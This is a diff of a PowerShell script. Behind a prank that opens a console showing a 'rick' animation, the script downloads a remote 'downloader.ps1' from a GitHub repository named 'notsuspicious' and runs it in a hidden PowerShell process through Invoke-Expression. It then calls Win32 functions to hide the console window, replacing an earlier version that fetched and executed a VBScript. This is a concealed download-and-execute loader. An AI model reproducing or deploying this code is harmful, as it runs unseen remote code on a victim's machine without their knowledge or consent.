@@ -6,13 +6,35 @@ Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowSt
 
 # Wait for a moment to let the windows start
 # Define the URL of the VBScript
-$vbsScriptUrl = "https://github.com/RaupenInspektor/notsuspicious/raw/main/script.vbs"
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
 
-# Download the content of the VBScript
-$vbsScriptContent = Invoke-WebRequest -Uri $vbsScriptUrl -UseBasicParsing | Select-Object -ExpandProperty Content
+    public class Win32 {
+        [DllImport("user32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-# Execute the VBScript content using the VBScript engine
-$shell = New-Object -ComObject "WScript.Shell"
-$shell.Exec($vbsScriptContent)
+        [DllImport("user32.dll")]
+        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    }
+"@
+
+# Define the command to execute the PowerShell script content from the web
+$command = "(Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content)"
+
+# Start a hidden PowerShell process
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell.exe"
+$psi.Arguments = "-NoLogo -NoProfile -Command $command"
+$psi.WindowStyle = "Hidden"
+
+$proc = [System.Diagnostics.Process]::Start($psi)
+
+# Find the window handle and hide it
+$handle = [Win32]::FindWindow("ConsoleWindowClass", $null)
+if ($handle -ne [System.IntPtr]::Zero) {
+    [Win32]::ShowWindow($handle, 0)  # 0 is SW_HIDE
+}
 
 
